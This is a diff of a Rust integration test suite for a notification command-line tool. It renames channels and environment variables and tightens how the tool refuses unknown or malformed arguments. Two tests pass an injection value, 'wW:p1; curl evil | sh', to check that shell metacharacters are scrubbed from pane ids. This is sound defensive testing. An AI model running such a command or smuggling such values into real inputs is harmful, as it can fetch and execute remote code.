@@ -5,7 +5,7 @@ fn a_pane_with_shell_metacharacters_is_scrubbed_from_every_delivered_event() {
     let sandbox = Sandbox::new("pane-scrub");
     let output = run(sandbox
         .pns()
-        .env("PNS_IDLE_SECS", "0")
+        .env("PNS_SCREEN_IDLE", "0")
         .args([
             "send",
             "--producer",
@@ -16,8 +16,8 @@ fn a_pane_with_shell_metacharacters_is_scrubbed_from_every_delivered_event() {
             "x",
         ])
         .args(["--pane", "wW:p1; curl evil | sh"]));
-    assert!(sandbox.fired("macos-banner"));
-    assert_eq!(sandbox.event("macos-banner")["pane"], "");
+    assert!(sandbox.fired("banner"));
+    assert_eq!(sandbox.event("banner")["pane"], "");
     assert!(
         stderr(&output).contains("dropped a pane id with shell metacharacters"),
         "{output:?}"
@@ -29,7 +29,7 @@ fn a_scrub_warning_is_not_printed_when_no_channel_will_run() {
     let sandbox = Sandbox::new("scrub-silent");
     let output = run(sandbox
         .pns()
-        .env("PNS_IDLE_SECS", "9000")
+        .env("PNS_SCREEN_IDLE", "9000")
         .args(["send", "--producer", "claude", "--state", "done"])
         .args(["--pane", "wW:p1; curl evil | sh"])
         .args(["--scope", "local_only"]));
@@ -37,16 +37,22 @@ fn a_scrub_warning_is_not_printed_when_no_channel_will_run() {
 }
 
 #[test]
-fn a_non_unicode_argument_never_breaks_the_exit_zero_edge() {
-    // The engine sits on an always-exit-0 path; a stray byte in argv must
-    // degrade like any unknown token, not abort the notification.
+fn a_non_unicode_argument_is_refused_like_any_other_unknown_word() {
+    // A stray byte in argv is read lossily and refused as the word it is,
+    // rather than aborting the process.
     let sandbox = Sandbox::new("non-unicode");
-    let output = run(sandbox
-        .pns()
-        .arg("send")
-        .arg(OsStr::from_bytes(&[0xff]))
-        .args(["--scope", "local_only"]));
-    assert_eq!(output.status.code(), Some(0), "{output:?}");
+    let output = run_expecting(
+        2,
+        sandbox
+            .pns()
+            .arg("send")
+            .arg(OsStr::from_bytes(&[0xff]))
+            .args(["--scope", "local_only"]),
+    );
+    assert!(
+        stderr(&output).contains("is not a flag pns takes"),
+        "{output:?}"
+    );
 }
 
 #[test]
@@ -76,7 +82,7 @@ fn the_help_flag_prints_the_usage_and_reaches_nothing_at_all() {
 
 #[test]
 fn a_word_that_names_no_command_is_refused_and_delivers_nothing() {
-    // THE HOUSE RULE `pns nag` already keeps, moved up to the top-level
+    // THE HOUSE RULE `pns remind` already keeps, moved up to the top-level
     // dispatch: an unknown argument never falls through to a fire. A mistyped
     // subcommand used to reach the lenient producer parser, which skipped the
     // word it did not know and notified about an empty event, so `pns stpo`
@@ -135,7 +141,7 @@ fn a_dash_led_first_word_is_no_longer_a_free_pass_for_an_empty_event() {
             "{word:?}: a refusal, never exit 0"
         );
         assert!(stderr(&output).contains("usage"), "{word:?}: {output:?}");
-        assert!(!sandbox.fired("mobile"), "{word:?} delivered: {output:?}");
+        assert!(!sandbox.fired("phone"), "{word:?} delivered: {output:?}");
         assert!(!sandbox.fired("hermes"), "{word:?} delivered: {output:?}");
     }
 }
@@ -151,7 +157,7 @@ fn a_typed_empty_word_is_refused_unlike_the_bare_invocation_beside_it() {
     let output = sandbox.pns().arg("").output().expect("the engine runs");
     assert_eq!(output.status.code(), Some(2), "{output:?}");
     assert!(stderr(&output).contains("usage"), "{output:?}");
-    assert!(!sandbox.fired("mobile"), "{output:?}");
+    assert!(!sandbox.fired("phone"), "{output:?}");
     assert!(!sandbox.fired("hermes"), "{output:?}");
 }
 
@@ -179,7 +185,7 @@ fn help_in_flag_position_wins_wherever_it_reaches_the_event_parser() {
         assert!(stdout(&output).contains("usage"), "{argv:?}: {output:?}");
         assert_eq!(stderr(&output), "", "{argv:?}: {output:?}");
         assert!(
-            !sandbox.fired("mobile"),
+            !sandbox.fired("phone"),
             "{argv:?} spawned a delivery: {output:?}"
         );
         assert!(
@@ -199,7 +205,7 @@ fn help_in_value_position_is_still_just_a_value() {
     run(sandbox
         .pns()
         .args(["send", "--producer", "--help", "--state", "done"]));
-    assert_eq!(sandbox.event("mobile")["agent"], "--help");
+    assert_eq!(sandbox.event("phone")["agent"], "--help");
 
     // The same word in `--state`'s value position is a value too, and the
     // closed set is what refuses it rather than the help text answering.
@@ -214,20 +220,20 @@ fn help_in_value_position_is_still_just_a_value() {
         String::from_utf8_lossy(&output.stderr),
         "pns: --state requires one of: done, failed, blocked, resolved, observation, progress\n"
     );
-    assert!(!sandbox.fired("mobile"));
+    assert!(!sandbox.fired("phone"));
 }
 
 #[test]
-fn a_missing_value_warning_keeps_its_exact_sentence() {
-    let sandbox = Sandbox::new("missing-value-warning");
-    let output = run(sandbox
-        .pns()
-        .args(["send", "--detail", "--scope", "local_only"]));
-    assert_eq!(
-        stderr(&output),
-        "pns: --detail given without a value; ignoring\n"
+fn a_missing_value_refusal_keeps_its_exact_sentence() {
+    let sandbox = Sandbox::new("missing-value-refusal");
+    let output = run_expecting(
+        2,
+        sandbox
+            .pns()
+            .args(["send", "--detail", "--scope", "local_only"]),
     );
-    assert!(!sandbox.fired("mobile"));
+    assert_eq!(stderr(&output), "pns: --detail requires a value\n");
+    assert!(!sandbox.fired("phone"));
     assert!(!sandbox.fired("hermes"));
 }
 
@@ -249,7 +255,7 @@ fn a_retired_subcommand_spelling_names_the_verb_that_replaced_it() {
         assert_eq!(output.status.code(), Some(2), "{word}: {output:?}");
         let complaint = stderr(&output);
         assert!(complaint.contains(replacement), "{word}: {complaint}");
-        assert!(!sandbox.fired("mobile"), "{word}: {output:?}");
+        assert!(!sandbox.fired("phone"), "{word}: {output:?}");
         assert!(!sandbox.fired("hermes"), "{word}: {output:?}");
     }
 }
@@ -263,7 +269,7 @@ fn an_observation_stated_as_a_flag_is_as_quiet_as_one_stated_as_json() {
     let sandbox = Sandbox::new("flag-observation");
     run(sandbox
         .pns()
-        .env("PNS_IDLE_SECS", "0")
+        .env("PNS_SCREEN_IDLE", "0")
         .env("PNS_FORCE_PHONE", "1")
         .args([
             "send",
@@ -274,14 +280,14 @@ fn an_observation_stated_as_a_flag_is_as_quiet_as_one_stated_as_json() {
             "--detail",
             "x",
         ]));
-    assert!(sandbox.fired("macos-banner"));
+    assert!(sandbox.fired("banner"));
     assert!(sandbox.fired("hermes"));
-    assert!(!sandbox.fired("mobile"), "an observation carded the phone");
+    assert!(!sandbox.fired("phone"), "an observation carded the phone");
 
     let sandbox = Sandbox::new("flag-done");
     run(sandbox
         .pns()
-        .env("PNS_IDLE_SECS", "0")
+        .env("PNS_SCREEN_IDLE", "0")
         .env("PNS_FORCE_PHONE", "1")
         .args([
             "send",
@@ -293,7 +299,7 @@ fn an_observation_stated_as_a_flag_is_as_quiet_as_one_stated_as_json() {
             "x",
         ]));
     assert!(
-        sandbox.fired("mobile"),
+        sandbox.fired("phone"),
         "an ordinary state stopped carding the phone"
     );
 }
@@ -313,7 +319,7 @@ fn a_state_outside_the_closed_set_is_refused_and_nothing_is_delivered() {
             "pns: --state requires one of: done, failed, blocked, resolved, observation, progress\n",
             "{word}"
         );
-        assert!(!sandbox.fired("macos-banner"), "{word}");
+        assert!(!sandbox.fired("banner"), "{word}");
         assert!(!sandbox.fired("hermes"), "{word}");
     }
 }
